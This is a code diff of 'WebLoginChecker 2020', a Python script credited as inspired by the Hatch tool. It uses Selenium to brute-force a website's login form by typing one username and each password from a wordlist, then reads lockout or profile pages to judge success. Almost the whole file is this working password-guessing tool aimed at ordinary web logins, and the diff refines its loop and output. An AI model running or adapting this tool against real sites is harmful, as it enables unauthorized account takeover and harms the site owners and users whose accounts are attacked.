@@ -1,4 +1,6 @@
-# WebLoginChecker 2020 by @lxndroc-@aoctut - edit on Hatch by @metachar
+# WebLoginChecker 2020
+# by @lxndroc-@aoctut
+# Inspiration credit: Hatch by @metachar
 from requests import get
 from selenium.common.exceptions import NoSuchElementException
 from selenium import webdriver
@@ -6,17 +8,17 @@ from time import sleep
 
 def check_website(website):
     STATUS_OK = 200
-    print('[!] Checking if site exists')
     try:
         request = get(website)
         if request.status_code == STATUS_OK:
-            print('[v] OK')
+            print(f'\n[v] Website {website} is accessible!')
             return True
     except:
-        print('[x] Website not accessible!')
+        print('\n[x] Website is not accessible!')
     return False
 
 def check_pass(website, username_selector, password_selector, login_button_selector, username, pass_list):
+    # update this with the path and filename of the Selenium Chrome driver, e.g. D:/utils/net/chromedriver
     DRIVER_PATH = 'chromedriver'
 
     if not website:
@@ -40,43 +42,48 @@ def check_pass(website, username_selector, password_selector, login_button_selec
     browser.get(website)
     try:
         user_entry = browser.find_element_by_css_selector(username_selector)
-        pass_entry = browser.find_element_by_css_selector(password_selector)
-        login_button = browser.find_element_by_css_selector(login_button_selector)
         for password in pass_file:
+            if try_count > 1:
+                print('[x] Login unsuccessful!')
+            pass_entry = browser.find_element_by_css_selector(password_selector)
+            login_button = browser.find_element_by_css_selector(login_button_selector)
             sleep(1)
-            user_entry.send_keys(username)
-            pass_entry.send_keys(password)
+            if try_count == 1:
+                user_entry.send_keys(username)
+            pass_entry.send_keys(password.strip())
             login_button.click()
-            print(24 * '-')
-            print(f'{try_count}. Tried password: {password} for user: {username}')
+            print(42 * '-')
+            print(f'[!] {try_count}. User: {username}\n       Password: {password.strip()}')
             try_count += 1
-    except KeyboardInterrupt:
-        return
-    except NoSuchElementException:
-        print('[!] Missing element from the web page')
+        user_entry = browser.find_element_by_css_selector(username_selector)        
         if try_count > 1:
-            print('[x] Attempts were limited or [v] Password was found!')
-            print(f'Last tried or found password: {password}')
+            print('[x] Login unsuccessful!\n' + 42 * '-' + '\n[!] Exiting')
         else:
-            print('[x] Selector not found or Attempts were limited!')            
-        return
-    except:
-        pass
+            print('[x] Empty password list!\n' + 42 * '-' + '\n[!] Exiting')
+    except KeyboardInterrupt:
+        print('[x] Keyboard interruption!\n' + 42 * '-' + '\n[!] Exiting')
+    except NoSuchElementException:
+        if try_count > 1:
+            print('[!] The login web page was updated!')
+            print('[v] Login successful if you see your profile page!')
+            print('[x] Attempts were limited if you see an attempt limitation page!\n' + 42 * '-' + '\n[!] Exiting in 1 min')
+            sleep(60)
+        else:
+            print('[x] Username, password, or login button selector not found!\n' + 42 * '-' + '\n[!] Exiting')
 
 def main():
-    BANNER = 'WebLoginChecker 2020 - by @lxndroc-@aoctut'
+    BANNER = '\n\tWebLoginChecker 2020 - by @lxndroc-@aoctut\n\t' + 42 * '-'
     # update this with the url to be checked, e.g. https://website.com
     WEBSITE = ''
-    # update this with the username field selector, e.g. #user_login
+    # update this with the username field CSS selector, e.g. #user_login
     USERNAME_SELECTOR = ''
-    # update this with the password field selector, e.g. #user_pass
+    # update this with the password field CSS selector, e.g. #user_pass
     PASSWORD_SELECTOR = ''
-    # update this with the login button selector, e.g. #wp-submit
+    # update this with the login button CSS selector, e.g. #wp-submit
     LOGIN_BUTTON_SELECTOR = ''
     # update this with the username to be checked, e.g. test
     USERNAME = ''
-    # update this with the path and filename containing the passwords to be checked, e.g. passlist.txt
-    PASS_LIST = ''
+    PASS_LIST = 'password_list.txt'
 
     print(BANNER)
     check_pass(WEBSITE, USERNAME_SELECTOR, PASSWORD_SELECTOR, LOGIN_BUTTON_SELECTOR, USERNAME, PASS_LIST)
